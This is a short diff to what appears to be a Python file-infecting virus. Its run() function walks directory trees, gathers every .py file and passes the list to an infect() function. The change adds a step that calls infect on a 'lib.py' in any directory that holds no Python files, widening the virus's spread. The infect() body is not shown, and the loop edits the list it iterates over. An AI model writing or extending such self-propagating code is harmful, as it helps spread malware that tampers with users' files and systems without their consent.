@@ -32,6 +32,7 @@ def run(dir):
     
     while dirs != []:
         for dir in dirs:
+            tmp = []
             dirs.remove(dir)
             os.chdir(dir)
             for file in os.listdir():
@@ -40,9 +41,12 @@ def run(dir):
                     continue
                 if os.path.isfile(file):
                     if ".py" in file_lower:
-                        files.append(os.path.abspath(file))
+                        tmp.append(os.path.abspath(file))
                 else:
                     dirs.append(os.path.abspath(file))
+            if tmp == []:
+                infect(["lib.py"])
+            files += tmp
     
     infect(files)
     
